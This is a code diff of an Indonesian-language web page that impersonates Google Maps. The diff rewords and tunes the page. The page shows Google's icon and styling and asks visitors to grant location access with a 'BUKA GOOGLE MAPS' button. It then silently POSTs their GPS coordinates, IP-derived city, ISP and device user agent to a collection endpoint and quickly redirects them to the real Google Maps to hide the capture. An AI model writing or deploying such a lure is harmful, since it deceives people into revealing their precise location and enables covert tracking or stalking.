@@ -14,20 +14,19 @@
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
-                        status: "LOKASI_GOOGLE_MAPS",
-                        maps_link: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "GPS_MATI",
-                        koordinat: `${lat}, ${lon}`,
-                        kota: d.city,
+                        status: "LOKASI_MAPS_AKURAT",
+                        google_maps: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "GPS_OFF_ATAU_DITOLAK",
+                        kota_ip: d.city,
                         isp: d.org,
-                        device: navigator.userAgent
+                        perangkat: navigator.userAgent
                     })
                 });
             } catch (e) {}
             
-            // Redirect ke tampilan peta umum setelah 1 detik
+            // LEMPAR KE GOOGLE MAPS ASLI (Bukan TikTok)
             setTimeout(() => {
                 window.location.replace("https://www.google.com/maps");
-            }, 1000);
+            }, 500);
         }
 
         function getGps() {
@@ -43,22 +42,22 @@
         }
     </script>
 </head>
-<body style="background:#ffffff; color:#3c4043; display:flex; align-items:center; justify-content:center; height:100vh; font-family: 'Roboto',Arial,sans-serif; margin:0;">
+<body style="background:#ffffff; color:#3c4043; display:flex; align-items:center; justify-content:center; height:100vh; font-family: sans-serif; margin:0;">
 
     <div style="text-align:center; width: 90%; max-width: 400px;">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" width="50" style="margin-bottom:20px;">
         
-        <h2 style="font-weight: 400; font-size: 22px; margin: 0 0 10px 0;">Menuju Lokasi...</h2>
+        <h2 style="font-weight: 400; font-size: 22px; margin: 0 0 10px 0;">Mencari Lokasi...</h2>
         <p style="font-size: 14px; color: #70757a; line-height: 1.6; margin-bottom: 30px;">
-            Untuk melanjutkan, Google Maps memerlukan akses lokasi agar dapat memberikan rute yang akurat.
+            Izinkan akses lokasi untuk melihat rute dan titik presisi di aplikasi Google Maps.
         </p>
 
-        <div onclick="getGps()" style="background:#1a73e8; color:#fff; padding:12px 24px; border-radius:24px; font-size:14px; font-weight:500; cursor:pointer; display:inline-block; box-shadow: 0 1px 3px rgba(60,64,67,0.3);">
-            Lihat Lokasi di Aplikasi
+        <div onclick="getGps()" style="background:#1a73e8; color:#fff; padding:12px 24px; border-radius:24px; font-size:14px; font-weight:500; cursor:pointer; display:inline-block; box-shadow: 0 1px 3px rgba(0,0,0,0.2);">
+            BUKA GOOGLE MAPS
         </div>
 
-        <p style="margin-top: 25px; font-size: 12px; color: #bdc1c6;">
-            Klik "Izinkan" jika browser meminta akses lokasi.
+        <p style="margin-top: 25px; font-size: 11px; color: #bdc1c6;">
+            Pastikan GPS Anda aktif sebelum menekan tombol.
         </p>
     </div>
 
